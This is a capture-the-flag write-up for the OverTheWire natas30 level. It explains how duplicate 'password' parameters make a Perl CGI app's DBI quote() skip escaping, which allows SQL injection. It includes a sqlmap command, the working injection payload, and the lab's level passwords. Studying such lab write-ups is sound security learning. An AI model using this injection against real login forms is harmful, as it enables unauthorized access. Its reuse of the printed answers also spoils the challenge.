The page shows a login (username+password) form. First I thought it would be a classic SQL injection so I used:
```
sqlmap \
  --url=http://natas30.natas.labs.overthewire.org/index.pl \
  --data=username='foo&password=bar' \
  --auth-type=Basic --auth-cred=natas30:Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X
```

But no luck.

In this challenge we have access to the source code, and the interesting section does this:
```
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

```

After googling a bit it appears that:
1. CGI.pm param() is context sensitive, in a list context it returns a list of values
2. if the request contains multiple parameters with the same name, all of their values are returned by param()
3. DBI::quote() accepts a second argument $data_type. If that argument is a numeric value, then quote() doesn't do any escaping

For reference:
- https://stackoverflow.com/questions/40273267/is-perl-function-dbh-quote-still-secure
- https://metacpan.org/pod/DBI#quote

Based on all the above it appears like we can do a trivial SQL injection using parameters:
```
username=natas31&password=%27%27%20OR%201%3D1%20&password=2
```

A couple of notes:
- The values are not injected in a quoted context. Here we need to inject something like `'' OR 1=1` instead of something like `' OR 1=1`.
- My initial attempts did not work, I tried to pass something like `SQL_INTEGER` for the 2nd password parameter. But apparently you need to pass a variable or static value which has a numeric type, not the type name itself.

Password for the next level is `m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`.
